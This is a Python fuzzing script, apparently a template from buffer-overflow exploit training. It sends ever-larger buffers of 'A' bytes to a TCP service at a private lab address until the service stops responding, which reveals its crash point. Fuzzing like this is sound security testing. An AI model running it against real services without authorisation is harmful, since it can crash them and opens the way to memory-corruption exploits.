#!/usr/bin/env python3

import socket
import time

# -------------------------- INFO --------------------------

# target address and port number
addr = "192.168.8.185"
port = 9000

# socket timeout
timeout = 4

# sleep time between connection attempts
sleep = 2

# prepend bytes
prepend = b""

# buffer increment
increment = b"A" * 1024
buf = increment

# append bytes
append = b""

# final payload
payload = prepend + buf + append

# ----------------------- TASK BEGIN -----------------------

error = False
while not error:
	soc = None
	try:
		soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		soc.settimeout(timeout)
		try:
			print(("Connecting to the target {0}:{1}").format(addr, port))
			soc.connect((addr, port))
		except socket.timeout:
			error = True
			print("Connecting to the target timed out")
		if not error:
			try:
				print(("Sending the payload... Size in bytes: {0}").format(len(buf)))
				soc.send(payload)
			except socket.timeout:
				error = True
				print("Sending the payload timed out")
	except socket.error as ex:
		error = True
		print(("EXCEPTION: {0}").format(ex))
	finally:
		if soc:
			soc.close()
	if not error:
		buf += increment
		payload = prepend + buf + append
		time.sleep(sleep)

# ------------------------ TASK END ------------------------
